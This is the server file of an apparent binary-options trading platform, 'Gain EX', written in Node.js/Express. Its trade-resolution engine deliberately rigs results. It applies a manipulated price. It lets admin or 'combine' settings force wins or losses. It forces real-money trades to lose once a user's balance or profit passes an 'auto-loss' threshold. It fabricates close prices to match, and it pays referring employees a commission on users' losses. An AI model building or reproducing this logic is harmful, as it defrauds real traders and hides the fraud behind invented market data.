const dns = require('dns');
if (dns.setDefaultResultOrder) {
  dns.setDefaultResultOrder('ipv4first');
}

const express = require('express');
const path = require('path');
const cors = require('cors');
const { initDB, getDB } = require('./db');
const { router: apiRouter, getLivePrice, getManipulatedPrice, getEffectiveTradeControl, clearActiveTradeCache } = require('./routes');

// Process-wide safety net to prevent server crashes on transient network rejections
process.on('unhandledRejection', (reason, promise) => {
  console.error('[SERVER WARN] Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('[SERVER FATAL] Uncaught Exception thrown:', err);
});


const app = express();
const PORT = process.env.PORT || 3000;

let dbInitError = null;

// Enable CORS
app.use(cors({
  origin: true,
  credentials: true
}));

// Express built-in parsers
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Database Diagnostics / Error Interception Middleware
app.use((req, res, next) => {
  if (dbInitError) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(500).send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Database Connection Error - Gain EX</title>
        <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
        <style>
          :root {
            --bg-main: #0b0e14;
            --bg-card: #151922;
            --primary: #2962ff;
            --danger: #ff3d71;
            --text-main: #ffffff;
            --text-muted: #90a4ae;
          }
          body {
            background-color: var(--bg-main);
            color: var(--text-main);
            font-family: 'Outfit', sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            box-sizing: border-box;
          }
          .card {
            background-color: var(--bg-card);
            border: 1px solid rgba(41, 98, 255, 0.15);
            border-radius: 16px;
            padding: 40px;
            max-width: 650px;
            width: 100%;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4), 0 0 20px rgba(41, 98, 255, 0.05);
            text-align: center;
          }
          .icon {
            font-size: 64px;
            color: var(--danger);
            margin-bottom: 20px;
            animation: pulse 2s infinite;
          }
          h1 {
            font-size: 28px;
            font-weight: 800;
            margin-top: 0;
            margin-bottom: 12px;
            letter-spacing: 0.5px;
          }
          p {
            color: var(--text-muted);
            line-height: 1.6;
            font-size: 16px;
            margin-bottom: 30px;
          }
          .error-box {
            background: rgba(255, 61, 113, 0.08);
            border: 1px solid rgba(255, 61, 113, 0.2);
            border-radius: 8px;
            padding: 16px;
            text-align: left;
            font-family: monospace;
            font-size: 14px;
            color: #ffb4c4;
            overflow-x: auto;
            margin-bottom: 30px;
          }
          .env-status-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            text-align: left;
            margin-bottom: 30px;
          }
          .env-item {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            padding: 12px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
          }
          .env-name {
            font-weight: 600;
            font-size: 13px;
            color: var(--text-muted);
          }
          .env-value {
            font-size: 12px;
            padding: 4px 8px;
            border-radius: 4px;
            font-weight: 600;
          }
          .env-value.found {
            background: rgba(46, 204, 113, 0.15);
            color: #2ecc71;
          }
          .env-value.missing {
            background: rgba(231, 76, 60, 0.15);
            color: #e74c3c;
          }
          .btn {
            background: linear-gradient(135deg, #2962ff, #1565c0);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(41, 98, 255, 0.3);
          }
          .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(41, 98, 255, 0.4);
          }
          @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
          }
        </style>
      </head>
      <body>
        <div class="card">
          <div class="icon">⚠️</div>
          <h1>Database Connection Failed</h1>
          <p>The Gain EX application booted successfully, but could not connect to your Supabase/PostgreSQL database due to missing or invalid environment variables.</p>
          
          <div class="error-box">
            <strong>Initialization Error:</strong><br>
            ${dbInitError.message}
          </div>

          <h2 style="font-size: 18px; text-align: left; margin-bottom: 15px;">Environment Check Status:</h2>
          <div class="env-status-grid">
            <div class="env-item">
              <span class="env-name">SUPABASE_URL</span>
              <span class="env-value ${process.env.SUPABASE_URL ? 'found' : 'missing'}">${process.env.SUPABASE_URL ? 'PRESENT' : 'MISSING'}</span>
            </div>
            <div class="env-item">
              <span class="env-name">SUPABASE_SERVICE_ROLE_KEY</span>
              <span class="env-value ${process.env.SUPABASE_SERVICE_ROLE_KEY ? 'found' : 'missing'}">${process.env.SUPABASE_SERVICE_ROLE_KEY ? 'PRESENT' : 'MISSING'}</span>
            </div>
            <div class="env-item">
              <span class="env-name">DATABASE_URL</span>
              <span class="env-value ${process.env.DATABASE_URL ? 'found' : 'missing'}">${process.env.DATABASE_URL ? 'PRESENT' : 'MISSING'}</span>
            </div>
            <div class="env-item">
              <span class="env-name">JWT_SECRET</span>
              <span class="env-value ${process.env.JWT_SECRET ? 'found' : 'missing'}">${process.env.JWT_SECRET ? 'PRESENT' : 'MISSING'}</span>
            </div>
          </div>

          <p style="font-size: 14px; margin-bottom: 25px;">
            <strong>How to fix:</strong> Add the missing keys above in your Hostinger Node.js application panel under <strong>Environment Variables</strong> (or create a <code>.env</code> file in the application's root directory) and then trigger a <strong>Redeployment / Restart</strong>.
          </p>

          <button onclick="window.location.reload()" class="btn">Retry Connection</button>
        </div>
      </body>
      </html>
    `);
  }
  next();
});

// Simple Custom Cookie Parser Middleware (Zero-dependency cookie parser)
app.use((req, res, next) => {
  req.cookies = {};
  const cookieHeader = req.headers.cookie;
  if (cookieHeader) {
    cookieHeader.split(';').forEach(cookie => {
      const parts = cookie.split('=');
      const name = parts[0].trim();
      const val = parts.slice(1).join('=').trim();
      req.cookies[name] = val;
    });
  }
  next();
});

// Maintenance Mode Interception Middleware
app.use(async (req, res, next) => {
  const isStaff = req.path.startsWith('/staff');
  const isUploads = req.path.startsWith('/uploads');
  const isAdminApi = req.path.startsWith('/api/admin') || req.path.startsWith('/api/auth');
  const isBrandAsset = req.path === '/logo.png' || req.path === '/favicon.png' || req.path === '/favicon.ico';

  if (isStaff || isUploads || isAdminApi || isBrandAsset) {
    return next();
  }

  try {
    const db = await getDB();
    if (db) {
      const maintModeRow = await db.get("SELECT value FROM settings WHERE key = 'maintenance_mode'");
      const isMaintenance = maintModeRow && maintModeRow.value === '1';

      if (isMaintenance) {
        if (req.path.startsWith('/api')) {
          return res.status(503).json({
            error: "Platform is currently undergoing scheduled maintenance. Please try again later.",
            maintenance: true
          });
        }

        const maintHtmlRow = await db.get("SELECT value FROM settings WHERE key = 'maintenance_html'");
        let maintenanceHtml = maintHtmlRow ? maintHtmlRow.value : '';

        if (!maintenanceHtml) {
          // Fallback default premium maintenance screen
          maintenanceHtml = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>System Maintenance - Gain EX</title>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-main: #06090f;
      --bg-card: #0d111a;
      --primary: #00e676;
      --primary-glow: rgba(0, 230, 118, 0.15);
      --border: rgba(255, 255, 255, 0.05);
      --text-main: #ffffff;
      --text-muted: #8b9bb4;
    }
    body {
      background-color: var(--bg-main);
      color: var(--text-main);
      font-family: 'Outfit', sans-serif;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      box-sizing: border-box;
      overflow: hidden;
      position: relative;
    }
    body::before {
      content: '';
      position: absolute;
      width: 600px;
      height: 600px;
      background: radial-gradient(circle, rgba(0, 230, 118, 0.05) 0%, transparent 70%);
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      pointer-events: none;
    }
    .container {
      max-width: 550px;
      width: 100%;
      background: var(--bg-card);
      border: 1.5px solid var(--border);
      border-radius: 24px;
      padding: 50px 40px;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5), 0 0 40px rgba(0, 230, 118, 0.02);
      text-align: center;
      position: relative;
    }
    .brand-logo {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 35px;
    }
    .brand-logo img {
      height: 54px;
      width: auto;
    }
    .maint-icon-container {
      position: relative;
      width: 100px;
      height: 100px;
      margin: 0 auto 30px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .maint-icon-bg {
      position: absolute;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      background: rgba(0, 230, 118, 0.05);
      border: 1px dashed rgba(0, 230, 118, 0.2);
      animation: rotateDashed 20s linear infinite;
    }
    .maint-icon {
      font-size: 44px;
      animation: gearPulse 3s ease-in-out infinite;
    }
    h1 {
      font-size: 28px;
      font-weight: 800;
      margin: 0 0 16px 0;
      letter-spacing: 0.5px;
      line-height: 1.3;
    }
    p {
      color: var(--text-muted);
      font-size: 15px;
      line-height: 1.6;
      margin: 0 0 35px 0;
    }
    .status-badge {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid var(--border);
      padding: 8px 16px;
      border-radius: 100px;
      font-size: 12px;
      font-weight: 600;
      color: var(--text-muted);
      margin-bottom: 10px;
    }
    .status-dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #ffc107;
      box-shadow: 0 0 8px #ffc107;
      animation: pulseDot 1.5s infinite;
    }
    .progress-bar-container {
      width: 100%;
      height: 4px;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 10px;
      overflow: hidden;
      margin-bottom: 25px;
    }
    .progress-bar-fill {
      height: 100%;
      width: 65%;
      background: linear-gradient(90deg, #00e676, #00b0ff);
      border-radius: 10px;
      animation: progressAnim 3s ease-in-out infinite alternate;
    }
    .footer-text {
      font-size: 12px;
      color: rgba(255, 255, 255, 0.2);
      margin-top: 20px;
    }
    @keyframes rotateDashed {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }
    @keyframes gearPulse {
      0% { transform: scale(1) rotate(0deg); }
      50% { transform: scale(1.08) rotate(180deg); }
      100% { transform: scale(1) rotate(360deg); }
    }
    @keyframes pulseDot {
      0% { opacity: 0.4; }
      50% { opacity: 1; }
      100% { opacity: 0.4; }
    }
    @keyframes progressAnim {
      0% { width: 10%; }
      100% { width: 90%; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="brand-logo">
      <img src="/logo.png" alt="Gain EX Logo">
    </div>
    <div class="maint-icon-container">
      <div class="maint-icon-bg"></div>
      <div class="maint-icon">⚙️</div>
    </div>
    <div class="status-badge">
      <span class="status-dot"></span>
      <span>System Update in Progress</span>
    </div>
    <h1>Scheduled Maintenance</h1>
    <p>We are currently upgrading our core infrastructure to deliver a faster, more secure, and extremely premium trading experience. We will be back online in just a few minutes. Thank you for your patience!</p>
    <div class="progress-bar-container">
      <div class="progress-bar-fill"></div>
    </div>
    <div class="footer-text">
      &copy; 2026 Gain EX. All rights reserved.
    </div>
  </div>
</body>
</html>`;
        }

        res.setHeader('Content-Type', 'text/html');
        return res.status(503).send(maintenanceHtml);
      }
    }
  } catch (err) {
    console.error('Maintenance mode middleware error:', err);
  }

  next();
});

// ─── Domain-Based Routing ───────────────────────────────────────────────────
// Bot site (bestaccuracy.com) → serves bot.html
// Main platform (all other domains) → serves index.html
// ─────────────────────────────────────────────────────────────────────────────
const BOT_DOMAIN_KEYWORD = 'bestaccuracy';

// Block /bot.html from being accessed directly on the main platform domain
app.use((req, res, next) => {
  const hostname = (req.hostname || '').toLowerCase();
  const isBotDomain = hostname.includes(BOT_DOMAIN_KEYWORD);
  if (!isBotDomain && (req.path === '/bot.html' || req.path === '/landing.html')) {
    // Redirect stray requests for bot pages to the bot domain
    return res.redirect(301, 'https://bestaccuracy.com/');
  }
  next();
});

// Serve root '/' and legacy landing paths — domain-aware
app.get(['/', '/index.html', '/landing', '/landing.html'], (req, res) => {
  const hostname = (req.hostname || '').toLowerCase();
  const isBotDomain = hostname.includes(BOT_DOMAIN_KEYWORD);
  if (isBotDomain) {
    return res.sendFile(path.join(__dirname, '..', 'public', 'bot.html'));
  }
  return res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

// Serve static public assets
app.use(express.static(path.join(__dirname, '..', 'public')));

// Serve uploads
const fs = require('fs');
if (process.env.VERCEL) {
  app.use('/uploads', express.static('/tmp/uploads'));
} else if (fs.existsSync('/data')) {
  app.use('/uploads', express.static('/data/uploads'));
}

// Staff panel: allow the HTML/CSS/JS assets to load so the login page works.
// The panel's own JavaScript checks auth on init and forces login if unauthenticated.
// All /api/admin/* routes are individually protected by JWT + role middleware.
app.get('/staff', (req, res, next) => {
  if (req.originalUrl === '/staff') {
    return res.redirect('/staff/');
  }
  next();
});
app.use('/staff', express.static(path.join(__dirname, '..', 'staff')));

// Catch-all for /staff/* so SPA routing works within the staff panel
app.get('/staff/*', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'staff', 'index.html'));
});

// Mount API routes
app.use('/api', apiRouter);

// Mount Admin Security Settings routes (password, email, 2FA)
app.use('/api/admin-settings', require('./admin-settings'));

// Fallback for Single Page Application routing - domain-aware
app.get('*', (req, res, next) => {
  if (req.path.startsWith('/api') || req.path.startsWith('/uploads')) {
    return next();
  }
  const hostname = (req.hostname || '').toLowerCase();
  const isBotDomain = hostname.includes(BOT_DOMAIN_KEYWORD);
  if (isBotDomain) {
    // Bot domain: unknown paths fallback to bot.html
    return res.sendFile(path.join(__dirname, '..', 'public', 'bot.html'));
  }
  // Main platform: SPA fallback to index.html
  res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

// Background Trade Resolution Engine
let isResolving = false;
async function resolveExpiredTrades() {
  if (isResolving) return;
  isResolving = true;
  const db = await getDB();
  try {
    const now = new Date().toISOString();

    // Read combine-trades settings once per cycle
    const combineRow = await db.get(`SELECT value FROM settings WHERE key = 'combine_trades_control'`);
    const outcomeRow = await db.get(`SELECT value FROM settings WHERE key = 'combine_trades_outcome'`);
    const combineEnabled = combineRow && combineRow.value === 'true';
    const combineOutcome = outcomeRow ? outcomeRow.value : 'none'; // 'win', 'lose', or 'none'

    // Fetch all active trades that have expired (no balance JOIN – we read balance atomically per-trade)
    const expiredTrades = await db.all(
      `SELECT t.*
       FROM trades t
       WHERE t.status = 'active' AND t.expires_at <= ?`,
      [now]
    );

    for (const trade of expiredTrades) {
      await db.run('BEGIN TRANSACTION');
      try {
        const rawPrice = await getLivePrice(trade.coin);
        let closePrice = await getManipulatedPrice(db, trade.user_id, trade.coin, rawPrice);
        let finalStatus = 'lose';

        // Check if dynamic Auto-Loss constraints are triggered (only for real/live accounts)
        let forceAutoLoss = false;
        if (trade.is_demo === 0 || !trade.is_demo) {
          const userState = await db.get(
            'SELECT balance, initial_balance, auto_loss_balance, auto_loss_pct FROM users WHERE id = ?',
            [trade.user_id]
          );
          if (userState) {
            // 1. Balance Threshold Limit:
            if (userState.auto_loss_balance !== null && userState.auto_loss_balance > 0) {
              if (parseFloat(userState.balance) >= parseFloat(userState.auto_loss_balance)) {
                forceAutoLoss = true;
              }
            }
            // 2. Profit Percentage Limit:
            if (userState.auto_loss_pct !== null && userState.auto_loss_pct > 0 && userState.initial_balance > 0) {
              const profit = parseFloat(userState.balance) - parseFloat(userState.initial_balance);
              const profitPct = (profit / parseFloat(userState.initial_balance)) * 100;
              if (profitPct >= parseFloat(userState.auto_loss_pct)) {
                forceAutoLoss = true;
              }
            }
          }
        }

        // Determine effective control: combine-mode overrides individual control
        let effectiveControl = trade.admin_control || 'none';
        if (combineEnabled && combineOutcome !== 'none') {
          effectiveControl = combineOutcome;
        }

        // Dynamic auto-loss overrides standard controls and forces outcome to lose
        if (forceAutoLoss) {
          effectiveControl = 'lose';
        }

        // Apply admin controls if forced
        if (effectiveControl === 'win') {
          finalStatus = 'win';
          // Ensure closing price direction matches selection
          if (trade.direction === 'UP' && closePrice <= trade.open_price) {
            closePrice = trade.open_price + (Math.random() * 0.0002 + 0.0001) * trade.open_price;
          } else if (trade.direction === 'DOWN' && closePrice >= trade.open_price) {
            closePrice = trade.open_price - (Math.random() * 0.0002 + 0.0001) * trade.open_price;
          }
        } else if (effectiveControl === 'lose') {
          finalStatus = 'lose';
          // Force opposite direction close price
          if (trade.direction === 'UP' && closePrice >= trade.open_price) {
            closePrice = trade.open_price - (Math.random() * 0.0002 + 0.0001) * trade.open_price;
          } else if (trade.direction === 'DOWN' && closePrice <= trade.open_price) {
            closePrice = trade.open_price + (Math.random() * 0.0002 + 0.0001) * trade.open_price;
          }
        } else {
          // Resolve naturally based on Binance price
          if (trade.direction === 'UP') {
            finalStatus = closePrice > trade.open_price ? 'win' : 'lose';
          } else {
            finalStatus = closePrice < trade.open_price ? 'win' : 'lose';
          }
        }

        // Update trade record first to prevent concurrent double-resolution
        const updateRes = await db.run(
          `UPDATE trades 
           SET status = ?, close_price = ?, resolved_at = ?, referrer_commission = 0.0
           WHERE id = ? AND status = 'active'
           RETURNING id`,
          [finalStatus, closePrice, new Date().toISOString(), trade.id]
        );

        if (!updateRes || updateRes.changes === 0) {
          // Already resolved by another instance
          await db.run('ROLLBACK');
          continue;
        }

        const isDemoTrade = trade.is_demo === 1;

        if (finalStatus === 'win') {
          // payout_pct stored in commission_pct column
          const payoutPct = trade.commission_pct;
          const profit = trade.amount * (payoutPct / 100.0);
          const totalReturn = trade.amount + profit;

          // Atomic balance credit using relative SQL arithmetic.
          // exec_sql ELSE branch: EXECUTE query then return '[]' — DML always runs.
          // balance = balance + totalReturn is safe for any number of concurrent/sequential wins.
          if (isDemoTrade) {
            await db.run(
              'UPDATE users SET demo_balance = COALESCE(demo_balance, 10000.0) + ? WHERE id = ?',
              [totalReturn, trade.user_id]
            );
          } else {
            await db.run(
              'UPDATE users SET balance = balance + ? WHERE id = ?',
              [totalReturn, trade.user_id]
            );
            // Read balance after the credit for the ledger entry only
            const userAfter = await db.get(
              'SELECT balance FROM users WHERE id = ?',
              [trade.user_id]
            );
            await db.run(
              `INSERT INTO ledger (user_id, type, amount, description, balance_after)
               VALUES (?, 'trade_win', ?, ?, ?)`,
              [trade.user_id, profit, `Trade payout for #${trade.id} on ${trade.coin} (${trade.direction}) — ${payoutPct}% payout`, userAfter ? userAfter.balance : null]
            );
          }
        } else {
          // If it is a loss on a real trade, check if the user is referred by an employee and apply commission
          if (!isDemoTrade) {
            try {
              const referredUser = await db.get("SELECT username, invited_by_id FROM users WHERE id = ?", [trade.user_id]);
              if (referredUser && referredUser.invited_by_id) {
                const referrerId = Number(referredUser.invited_by_id);
                const referrer = await db.get("SELECT role, balance, currency FROM users WHERE id = ?", [referrerId]);
                if (referrer && referrer.role === 'employee') {
                  // Get commission percentage
                  let referralCommissionPct = 5.0;
                  const refCodeRow = await db.get('SELECT commission_pct FROM invite_codes WHERE created_by_id = ? AND commission_pct IS NOT NULL LIMIT 1', [referrerId]);
                  if (refCodeRow && refCodeRow.commission_pct !== null && refCodeRow.commission_pct !== undefined) {
                    referralCommissionPct = parseFloat(refCodeRow.commission_pct);
                  } else {
                    const pctRow = await db.get("SELECT value FROM settings WHERE key = 'referral_commission_pct'");
                    referralCommissionPct = pctRow ? parseFloat(pctRow.value) : 5.0;
                  }

                  const commissionAmount = trade.amount * (referralCommissionPct / 100.0);
                  if (commissionAmount > 0) {
                    // Fetch exchange rate for the employee's currency
                    let rate = 1.0;
                    if (referrer.currency && referrer.currency.toUpperCase() !== 'USD') {
                      const rateRow = await db.get('SELECT value FROM settings WHERE key = ?', [`currency_rate_${referrer.currency.toUpperCase()}`]);
                      if (rateRow) {
                        const parsedRate = parseFloat(rateRow.value);
                        if (!isNaN(parsedRate) && parsedRate > 0) {
                          rate = parsedRate;
                        }
                      }
                    }

                    const commissionInLocal = commissionAmount * rate;
                    const newReferrerBalance = (referrer.balance || 0) + commissionInLocal;

                    // Credit referrer balance
                    await db.run("UPDATE users SET balance = ? WHERE id = ?", [newReferrerBalance, referrerId]);

                    // Save referrer commission on trades table
                    await db.run("UPDATE trades SET referrer_commission = ? WHERE id = ?", [commissionAmount, trade.id]);

                    // Insert referrer ledger
                    const desc = `Referral Trade Loss Commission (${referralCommissionPct}%) for trade #${trade.id} lost by ${referredUser.username}`;
                    await db.run(
                      `INSERT INTO ledger (user_id, type, amount, description, balance_after)
                       VALUES (?, 'referral_commission', ?, ?, ?)`,
                      [referrerId, commissionInLocal, desc, newReferrerBalance]
                    );
                    console.log(`[REFERRAL LOSS COMMISSION] Credited employee #${referrerId} with ${commissionInLocal} local commission (loss trade #${trade.id} of referred user #${trade.user_id})`);
                  }
                }
              }
            } catch (referralErr) {
              console.error('[REFERRAL LOSS COMMISSION ERROR]:', referralErr.message);
            }
          }
        }

        await db.run('COMMIT');
        if (typeof clearActiveTradeCache === 'function') {
          clearActiveTradeCache(trade.user_id);
        }
        const src = combineEnabled && combineOutcome !== 'none' ? '[COMBINE]' : '';
        console.log(`[RESOLVED${src}] Trade #${trade.id} of user #${trade.user_id} resolved as ${finalStatus.toUpperCase()} (open: ${trade.open_price}, close: ${closePrice})`);
      } catch (err) {
        await db.run('ROLLBACK');
        console.error(`[RESOLVED ERROR] Trade #${trade.id} rollback:`, err.message);
      }
    }
  } catch (err) {
    console.error('[RESOLVED ENGINE ERROR]:', err.message);
  } finally {
    isResolving = false;
  }
}

// Background Payout Randomizer
let lastRandomizeTime = null;
async function checkAndRandomizePayouts() {
  const db = await getDB();
  try {
    const intervalRow = await db.get("SELECT value FROM settings WHERE key = 'payout_randomize_interval'");
    const intervalMins = intervalRow ? parseInt(intervalRow.value) : 10;
    
    const settingsRow = await db.get("SELECT value FROM settings WHERE key = 'asset_payout_settings'");
    let payoutSettings = {};
    if (settingsRow && settingsRow.value) {
      try {
        payoutSettings = JSON.parse(settingsRow.value);
      } catch (e) {
        payoutSettings = {};
      }
    }

    // Default coins if empty
    const visibleCoinsRow = await db.get("SELECT value FROM settings WHERE key = 'crypto_visible_coins'");
    const visibleCoins = visibleCoinsRow ? JSON.parse(visibleCoinsRow.value) : ['BTC','ETH','SOL','BNB','DOGE','XRP','ADA','AVAX','MATIC','LINK','LTC','DOT','TRX','UNI','ATOM'];
    const forexVisibleRow = await db.get("SELECT value FROM settings WHERE key = 'forex_visible_pairs'");
    const forexVisible = forexVisibleRow ? JSON.parse(forexVisibleRow.value) : ['EUR/USD', 'USD/CAD', 'GBP/USD', 'USD/JPY', 'AUD/USD'];
    const allAssets = [...visibleCoins.map(c => `${c}/USDT`), ...forexVisible];

    // Check if interval has elapsed since lastRandomizeTime
    const now = Date.now();
    let needUpdate = false;
    
    if (!lastRandomizeTime || (now - lastRandomizeTime) >= intervalMins * 60 * 1000) {
      lastRandomizeTime = now;
      needUpdate = true;
    }

    if (needUpdate) {
      let updated = false;
      for (const asset of allAssets) {
        if (!payoutSettings[asset]) {
          payoutSettings[asset] = { min: 75, max: 95, current: 85 };
          updated = true;
        }
        const minVal = payoutSettings[asset].min !== undefined ? parseInt(payoutSettings[asset].min) : 75;
        const maxVal = payoutSettings[asset].max !== undefined ? parseInt(payoutSettings[asset].max) : 95;
        
        // Random payout between min and max
        const randomPayout = Math.floor(Math.random() * (maxVal - minVal + 1)) + minVal;
        if (payoutSettings[asset].current !== randomPayout) {
          payoutSettings[asset].current = randomPayout;
          updated = true;
        }
      }

      if (updated) {
        await db.run(
          `INSERT INTO settings (key, value) VALUES ('asset_payout_settings', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value`,
          [JSON.stringify(payoutSettings)]
        );
        console.log(`[PAYOUT ENGINE] Randomized payout percentages for assets.`);
      }
    }
  } catch (err) {
    console.error('[PAYOUT ENGINE ERROR]:', err.message);
  }
}

// Call app.listen immediately on startup to satisfy Hostinger/Passenger < 3s requirement
if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`===================================================`);
    console.log(`🚀 Gain EX Server running at: http://localhost:${PORT}`);
    console.log(`===================================================`);
  });
} else {
  console.log('Serverless mode: Skipping app.listen and background schedulers.');
}

// Perform DB and background engine initialization asynchronously after listen
async function startServer() {
  try {
    await initDB();
    console.log('Database initialized successfully.');

    // Initialize OTC Engine
    try {
      const otcEngine = require('./services/otcEngine');
      await otcEngine.init();
    } catch (otcErr) {
      console.error('[OTC ENGINE ERROR]:', otcErr.message);
    }

    if (!process.env.VERCEL && !dbInitError) {
      setInterval(resolveExpiredTrades, 1000);
      setInterval(checkAndRandomizePayouts, 5000);
      
      try {
        await checkAndRandomizePayouts();
      } catch (err) {
        console.error('Failed to run initial checkAndRandomizePayouts:', err.message);
      }
    }
  } catch (error) {
    dbInitError = error;
    console.error('Non-fatal error: Database initialization failed:', error.message);
  }
}

startServer();

module.exports = app;
